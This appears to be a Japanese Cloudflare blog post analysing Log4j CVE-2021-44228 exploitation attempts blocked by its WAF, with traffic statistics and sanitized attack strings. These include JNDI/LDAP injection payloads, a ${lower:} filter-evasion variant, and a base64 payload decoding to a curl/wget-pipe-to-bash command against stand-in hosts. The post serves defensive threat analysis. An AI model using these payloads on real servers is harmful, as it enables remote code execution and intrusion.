<div class="post-content lh-copy gray1">
	<p>私は<a href="https://blog.cloudflare.com/ja-jp/inside-the-log4j2-vulnerability-cve-2021-44228-ja-jp/">以前に</a>、Log4j の CVE-2021-44228 をどのように軽減するか、どのようにしてこの脆弱性が発生したのか、そして Cloudflare のお客様に対する緩和策について書きました。この記事を書いている間にも、この脆弱性の深刻さを受けて、FREE のお客様にも保護策を展開しています。</p>
	<p>スキャンや脆弱性の悪用を試みた何時間ものデータが揃っているので、実際に使用されているペイロードや統計を調べ始めることができます。まず、Cloudflare が WAF を通じてブロックしているリクエストから始めましょう。</p>
	<p>今朝は、ブロックされた攻撃がゆっくりと増加し（時間は UTC）、1,800件辺りに最大のピークを迎えました（1分間におよそ20,000件のエクスプロイトリクエストがブロックされています）。しかし、スキャンは1日中継続して行われています。今後もこの状態が続くと思われます。</p>
	<figure class="kg-card kg-image-card kg-width-wide"><img src="https://blog.cloudflare.com/content/images/2021/12/image3-25.png" class="kg-image"></figure>
	<p>また、WAF がブロックしている IP アドレスの数を見てみました。200から400のIPアドレスが常にスキャンされているようです。</p>
	<figure class="kg-card kg-image-card kg-width-wide"><img src="https://blog.cloudflare.com/content/images/2021/12/image1-58.png" class="kg-image"></figure>
	<p>これまでのところ、スキャンや不正使用の試みは、カナダ、そして米国からのものが最も多くなっています。</p>
	<figure class="kg-card kg-image-card kg-width-wide"><img src="https://blog.cloudflare.com/content/images/2021/12/image2-42.png" class="kg-image"></figure>
	<p>ブロックされたリクエストの多くは、サーバーが実際に悪用可能かどうかを確認するための偵察のようです。ブロックされた上位のエクスプロイトの文字列は次の通りです（ドメイン名と IP アドレスはすべてサニタイズしています）。</p>
	<p><code>${jndi:ldap://x.x.x.x/#Touch}</code></p>
	<p>これは、アクターが管理しているであろうx.x.x.xのサーバーを攻撃し、インターネットプロパティが悪用可能であることを記録する簡単な方法のように見えます。しかし、これだけではアクターにはあまり伝わりません。2番目に多かったリクエストには次のようなものがありました。</p>
	<p><code>Mozilla/5.0 ${jndi:ldap://x.x.x.x:5555/ExploitD}/ua</code></p>
	<p>これは、リクエストの User-Agent フィールドに表示されました。URI の末尾に /ua と書かれていることに注目してください。これは、アクターにとって、User-Agentを利用したエクスプロイトが有効であることを示す手がかりとなるでしょう。</p>
	<p>別の興味深いペイロードでは、アクターがうまくいくフォーマットを詳しく説明していたことを表しています（この場合、ポート443への非暗号化リクエストで、彼らは http:// を使おうとしていました）。</p>
	<p><code>${jndi:http://x.x.x.x/callback/https-port-443-and-http-callback-scheme}</code></p>
	<p>誰かが Googlebot のふりをして、余分な情報を入れようとしたのです。</p>
	<p><code>Googlebot/2.1 (+http://www.google.com/bot.html)${jndi:ldap://x.x.x.x:80/Log4jRCE}</code></p>
	<p>次のケースでは、アクターは Cloudflare のパブリックIPを利用しており、その IP アドレスをエクスプロイトのペイロードにエンコードしています。そうすることで、多くの IP をスキャンし、どの IP が脆弱であるかを知ることができました。</p>
	<p><code>${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}</code></p>
	<p>このスキームのバリエーションとして、攻撃を受けた Webサイトの名前をエクスプロイトのペイロードに含めるというものがありました。</p>
	<p><code>${jndi:ldap://www.blogs.example.com.gu.c1me2000ssggnaro4eyyb.example.com/www.blogs.example.com}</code></p>
	<p>LDAP を使わずに DNS を使っているアクターもいました。しかし、LDAP は最も一般的に使用されているプロトコルです。</p>
	<p><code>${jndi:dns://aeutbj.example.com/ext}</code></p>
	<p>非常に興味深いスキャンは、Java と Linux の標準的なコマンドラインツールを使用したものです。ペイロードは次のようなものです。</p>
	<p><code>${jndi:ldap://x.x.x.x:12344/Basic/Command/Base64/KGN1cmwgLXMgeC54LngueDo1ODc0L3kueS55Lnk6NDQzfHx3Z2V0IC1xIC1PLSB4LngueC54OjU4NzQveS55LnkueTo0NDMpfGJhc2g=}</code></p>
	<p>base64 でエンコードされた部分をデコードすると、curl と wget が bash にパイプで接続されます。</p>
	<p><code>(curl -s x.x.x.x:5874/y.y.y.y:443||wget -q -O- x.x.x.x:5874/y.y.y.y:443)|bash</code></p>
	<p>curl/wget からの出力は必須ではないので、これはアクターにエクスプロイトが成功したことを示すためにサーバーを叩いているだけであることに注意してください。</p>
	<p>最後に、Log4j の他の機能を使って、${jndi:ldap}のような文字列の単純なブロックを回避しようとする活発な試みが見られます。例えば、${lower}機能（文字を小文字にする）を使って、次のように回避するのが一般的なようです。</p>
	<p><code>${jndi:${lower:l}${lower:d}a${lower:p}://example.com/x</code></p>
	<p>現時点では、多くの偵察が行われているようです。善人も悪人も、世界中の脆弱なサーバーをスキャンしています。最終的には、こうした偵察活動の一部が、実際にサーバーや企業に侵入することになるでしょう。ログはフロントエンドとバックエンドのシステムに深く埋め込まれているため、数時間から数日は明らかにならないものもあります。</p>
	<p>地中で静かに成長する胞子のように、あるものは土を突き破って光の中に出てきます。</p>
	<figure class="kg-card kg-image-card"><img src="https://blog.cloudflare.com/content/images/2021/12/Spores.png" class="kg-image"></figure>
	<p>Cloudflare のセキュリティチームは、悪意のある試みが進化するのに合わせて継続的に作業を行っており、必要に応じて WAF やファイアウォールのルールを更新していきます。</p>
</div>